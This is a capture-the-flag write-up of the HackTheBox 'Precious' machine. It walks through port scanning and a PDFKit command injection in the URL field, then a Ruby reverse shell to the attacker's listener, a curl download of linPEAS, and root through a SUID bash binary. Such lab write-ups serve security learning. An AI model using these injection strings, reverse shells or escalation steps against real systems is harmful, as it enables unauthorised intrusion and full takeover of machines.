# HackTheBox Precious Writeup

<!-- Description -->

![Precious](imgs/machine.png)

Completed on 26 Jan 2023
<!-- /Description -->

## Table of Contents

<!-- TOC -->
- [HackTheBox - Precious - WriteUp](#hackthebox-precious-writeup)
  - [Table of Contents](#table-of-contents)
  - [Let's Get Going!](#lets-get-going)
    - [Enumeration](#enumeration)
      - [Nmap Scan](#nmap-scan)
      - [HTTP - Port 80](#http---port-80)
    - [Exploitation](#exploitation)
      - [Ruby PDFKit Command Injection](#ruby-pdfkit-command-injection)
    - [Post Exploitation](#post-exploitation)
      - [Admin's Fatal Error](#admins-fatal-error)

<!-- /TOC -->

---

## Let's Get Going
Connect to HackTheBox network with openvpn and start scanning the machine.

### Enumeration
#### Nmap Scan
We start by running a nmap Syn Scan to find potentially open ports.
```bash
$ sudo nmap -sS -Pn -n -oN nmapss 10.10.11.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 13:10 EST
Nmap scan report for 10.10.11.189
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.33 seconds
```
Going further we can try to version scan the two open ports in order to get more details of what we are dealing with.
```bash
$ nmap -sV -Pn -n -oN nmapsv 10.10.11.189
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 13:06 EST
Nmap scan report for 10.10.11.189
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
So we got two open ports hosting a web app and a ssh server and we were able to determine services versions. 
For now we can continue with further scanning of each ports and finding out more about each service.

#### HTTP - Port 80
We can run now a nikto scan which runs automated scan on the web app to find more info about it.
```bash
$ nikto -h http://10.10.11.189:80/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.189
+ Target Hostname:    10.10.11.189
+ Target Port:        80
+ Start Time:         2023-01-24 14:37:03 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: http://precious.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)

+ 7889 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-01-24 14:51:47 (GMT-5) (884 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nothing particularly interesting. We try now to visit the web app and see what's hosted.
Visiting $ip:80 returns an error.
The server returned 302 response to the browser and hence redirected it to the domain name precious.htb which couldn't be resolved.

![Precious](imgs/dnserror.png)

To solve that we must edit /etc/hosts file and add the resolution for the browser "$ip precious.htb".
Visiting precious.htb now returns successfully the web page.

![Precious](imgs/webpage.png)

At first glance, we notice one main functionality of this web app: URL to pdf. Checking Page Source and running directory fuzzing returns no other results at all.
So it seems we have to find out more about this functionality.
Sending as input any public URL returns the following error.

![Precious](imgs/interneterror.png)

So we can try setting up a local server on our machine and see if the remote server visits us.
We run the following command after creating a basic index.html file.
```bash
$ php -S 10.10.14.116:8000
[Tue Jan 24 15:05:45 2023] PHP 8.1.12 Development Server (http://10.10.14.116:8000) started
```
By inputting the address to our local server we get the visit!
```bash
[Tue Jan 24 15:07:26 2023] 10.10.11.189:51626 Accepted
[Tue Jan 24 15:07:26 2023] 10.10.11.189:51626 [200]: GET /
[Tue Jan 24 15:07:26 2023] 10.10.11.189:51626 Closing
```
On the other hand, in the browser, we get our pdf.

![Precious](imgs/receivedpdf.png)

Going further, we try to inspect the web page with Burp Suite. Upon requesting the root directory and intercepting the response we start getting more details.

![Precious](imgs/burpsuiteroot.png)

We can see the response header "X-Runtime" with the value "Ruby", hinting the backend could be written in the Ruby programming language. We can see aswell Phusion Passenger which is an app server that supports Ruby.
Great! We can continue now by inspecting the response of the web app to the URL input.

![Precious](imgs/burpsuiteresponse.png)

As we can see the response contains the generated pdf file. Going through its contents, we notice data refering to the tool that generated the pdf.

![Precious](imgs/pdfkit.png)

---

### Exploitation

#### Ruby PDFKit Command Injection
Searching through the internet about pdfkit v0.8.6, shows that it is actually a module in Ruby that generates PDFs from given URLs. Going further, we can find that the version used in our web app is old and critically vulnerable to command injection!
The injection works as follows: When user input (URL) gets passed to the application and if the provided URL's parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF/
```
http://10.10.14.116:8000/?c=%20`curl http://10.10.14.116:443/`
```
To verify if the above injection work, I setup a local php server on port 443 and passed the above input to the app. And to no surprise, the app did make the request to the server on port 443. 
```bash
$ php -S 10.10.14.116:443 
[Tue Jan 24 18:59:04 2023] PHP 8.1.12 Development Server (http://10.10.14.116:443) started
[Tue Jan 24 18:59:08 2023] 10.10.11.189:37630 Accepted
[Tue Jan 24 18:59:08 2023] 10.10.11.189:37630 [200]: GET /
[Tue Jan 24 18:59:08 2023] 10.10.11.189:37630 Closing
```

We can now attempt to spawn a reverse shell to access the machine. Using the [reverse shell generator](https://www.revshells.com/), we get our ruby payload, that we append to the URL.
```ruby
ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.116",4242))'
```

We then setup our listener on port 4242 and send the payload to the server..

```bash
$ nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.116] from (UNKNOWN) [10.10.11.189] 52102

ls
app
config
config.ru
Gemfile
Gemfile.lock
pdf
public

whoami
ruby
```

And we are in!!

### Post Exploitation
#### Admin's Fatal Error
Final step of the exploit is to try and get root access to the machine. A nice way to start is to run an automated script that searches for ways to escalate privileges on Linus machines. One handy tool that does so is [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) which is a shell script that runs multiple checks on the system and tries to find any interesting paths to try. Now, since the victim machine has no internet access, we have to download the script to our local machine first then set up a local server so we can receive it in the victim machine.

```bash
curl http://10.10.14.116:8000/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
 10  808k   10 86125    0     0  60353      0  0:00:13  0:00:01  0:00:12 60311
100  808k  100  808k    0     0  69460      0  0:00:11  0:00:11 --:--:-- 70569

ls
linpeas.sh
```
Running the script outputs plenty of information about the machine. Going through all the info, we found something very interesting

![Precious](imgs/linpeas.png)

Apparently the administrator had set the SUID bit to the file /usr/bin/bash which is owned by root.
This would actually allow us to run it and get a shell with root priveleges.
```bash
whoami
ruby
/usr/bin/bash -p
whoami
root
```
The -p flag is used here to indicate that we are running the file with elevated privileges. So just like that we were able to get root access on the machine. We can now get the flags from /home/henry and /root directories and finish the machine :D

---

> Any feedback would be appreciated. Thank you !
